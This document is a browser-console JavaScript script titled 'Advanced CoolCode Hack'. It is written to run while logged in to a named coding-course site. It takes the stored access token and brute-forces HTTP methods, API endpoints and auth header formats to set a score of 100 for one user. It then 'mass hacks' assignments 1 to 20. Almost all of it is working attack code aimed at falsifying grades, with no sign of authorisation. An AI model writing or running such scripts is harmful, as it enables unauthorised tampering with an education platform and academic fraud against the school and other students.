// ADVANCED COOLCODE HACK - COPY TO BROWSER CONSOLE
// Try this while logged in to https://coolcode-hacker-34c5455cd908.herokuapp.com

console.log("🔧 Advanced CoolCode Hack - Multiple Strategies");
console.log("==============================================");

const token = localStorage.getItem('ACCESS_TOKEN');
console.log("Token found:", !!token);

// Strategy 1: Try different HTTP methods
async function tryDifferentMethods() {
    console.log("\n🔄 Strategy 1: Testing different HTTP methods");
    
    const url = '/api/api/assignment/score';
    const data = {
        username: '98ixul',
        assignmentId: 1,
        score: 100
    };
    
    const methods = ['POST', 'PUT', 'PATCH'];
    
    for (const method of methods) {
        try {
            console.log(`Testing ${method} method...`);
            const response = await fetch(url, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify(data)
            });
            
            const result = await response.text();
            console.log(`${method}: ${response.status} - ${result}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS with ${method}!`);
                return method;
            }
        } catch (error) {
            console.log(`${method} error:`, error.message);
        }
    }
    return null;
}

// Strategy 2: Try different API endpoints
async function tryDifferentEndpoints() {
    console.log("\n🎯 Strategy 2: Testing different API endpoints");
    
    const endpoints = [
        '/api/api/assignment/score',
        '/api/assignment/score',
        '/api/api/assignment/update-score',
        '/api/assignment/update-score',
        '/api/api/score/update',
        '/api/score/update',
        '/api/api/assignment/1/score',
        '/api/assignment/1/score'
    ];
    
    const data = {
        username: '98ixul',
        assignmentId: 1,
        score: 100
    };
    
    for (const endpoint of endpoints) {
        try {
            console.log(`Testing endpoint: ${endpoint}`);
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'ACCESS_TOKEN': token
                },
                body: JSON.stringify(data)
            });
            
            const result = await response.text();
            console.log(`${endpoint}: ${response.status} - ${result.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS with endpoint: ${endpoint}!`);
                return endpoint;
            }
        } catch (error) {
            console.log(`${endpoint} error:`, error.message);
        }
    }
    return null;
}

// Strategy 3: Try different header formats
async function tryDifferentHeaders() {
    console.log("\n🔑 Strategy 3: Testing different authentication headers");
    
    const url = '/api/api/assignment/score';
    const data = {
        username: '98ixul',
        assignmentId: 1,
        score: 100
    };
    
    const headerVariations = [
        { 'Content-Type': 'application/json', 'ACCESS_TOKEN': token },
        { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        { 'Content-Type': 'application/json', 'X-Auth-Token': token },
        { 'Content-Type': 'application/json', 'access-token': token },
        { 'Content-Type': 'application/json', 'x-access-token': token },
        { 'Content-Type': 'application/json', 'token': token },
    ];
    
    for (let i = 0; i < headerVariations.length; i++) {
        try {
            console.log(`Testing header variation ${i + 1}:`, Object.keys(headerVariations[i]).filter(k => k !== 'Content-Type'));
            const response = await fetch(url, {
                method: 'POST',
                headers: headerVariations[i],
                body: JSON.stringify(data)
            });
            
            const result = await response.text();
            console.log(`Variation ${i + 1}: ${response.status} - ${result.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`✅ SUCCESS with header variation ${i + 1}!`);
                return headerVariations[i];
            }
        } catch (error) {
            console.log(`Variation ${i + 1} error:`, error.message);
        }
    }
    return null;
}

// Strategy 4: Try with session cookies instead of token
async function tryWithCookies() {
    console.log("\n🍪 Strategy 4: Testing with cookies only (no token)");
    
    const url = '/api/api/assignment/score';
    const data = {
        username: '98ixul',
        assignmentId: 1,
        score: 100
    };
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            credentials: 'include'  // Include cookies
        });
        
        const result = await response.text();
        console.log(`Cookie auth: ${response.status} - ${result}`);
        
        if (response.ok) {
            console.log("✅ SUCCESS with cookie authentication!");
            return true;
        }
    } catch (error) {
        console.log("Cookie auth error:", error.message);
    }
    return false;
}

// Strategy 5: Try GET request to understand the API structure
async function exploreAPI() {
    console.log("\n🔍 Strategy 5: Exploring API structure");
    
    const endpoints = [
        '/api/api/assignment',
        '/api/api/user/98ixul',
        '/api/api/assignment/1',
        '/api/api/scores',
        '/api/user/98ixul/scores'
    ];
    
    for (const endpoint of endpoints) {
        try {
            console.log(`GET ${endpoint}`);
            const response = await fetch(endpoint, {
                method: 'GET',
                headers: {
                    'ACCESS_TOKEN': token
                }
            });
            
            const result = await response.text();
            console.log(`${endpoint}: ${response.status}`);
            
            if (response.ok) {
                console.log(`✅ Successful GET: ${endpoint}`);
                console.log("Response:", result.substring(0, 200));
            }
        } catch (error) {
            console.log(`${endpoint} error:`, error.message);
        }
    }
}

// Strategy 6: Mass hack if we find a working method
async function massHack(workingMethod, workingEndpoint, workingHeaders) {
    console.log("\n🚀 Strategy 6: Mass hacking all assignments");
    
    let successCount = 0;
    const endpoint = workingEndpoint || '/api/api/assignment/score';
    const method = workingMethod || 'POST';
    const headers = workingHeaders || {
        'Content-Type': 'application/json',
        'ACCESS_TOKEN': token
    };
    
    for (let assignmentId = 1; assignmentId <= 20; assignmentId++) {
        try {
            const data = {
                username: '98ixul',
                assignmentId: assignmentId,
                score: 100
            };
            
            const response = await fetch(endpoint, {
                method: method,
                headers: headers,
                body: JSON.stringify(data)
            });
            
            if (response.ok) {
                console.log(`✅ Assignment ${assignmentId}: SUCCESS!`);
                successCount++;
            } else {
                console.log(`❌ Assignment ${assignmentId}: Failed (${response.status})`);
            }
            
            await new Promise(resolve => setTimeout(resolve, 200));
        } catch (error) {
            console.log(`❌ Assignment ${assignmentId}: Error`);
        }
    }
    
    console.log(`\n🎉 Total successful hacks: ${successCount}`);
    return successCount;
}

// Main execution
async function advancedHack() {
    if (!token) {
        console.log("❌ No ACCESS_TOKEN found!");
        return;
    }
    
    console.log("Starting advanced hack strategies...\n");
    
    // Try all strategies
    const workingMethod = await tryDifferentMethods();
    const workingEndpoint = await tryDifferentEndpoints();
    const workingHeaders = await tryDifferentHeaders();
    const cookiesWork = await tryWithCookies();
    
    await exploreAPI();
    
    // If any strategy worked, try mass hack
    if (workingMethod || workingEndpoint || workingHeaders || cookiesWork) {
        console.log("\n🎯 Found working method! Attempting mass hack...");
        await massHack(workingMethod, workingEndpoint, workingHeaders);
    } else {
        console.log("\n💡 All strategies failed. Possible issues:");
        console.log("1. API requires admin/teacher privileges");
        console.log("2. Token is expired or invalid");
        console.log("3. CSRF protection is enabled");
        console.log("4. Rate limiting is blocking requests");
        console.log("5. The API endpoint structure is different");
    }
}

// Run the advanced hack
advancedHack();
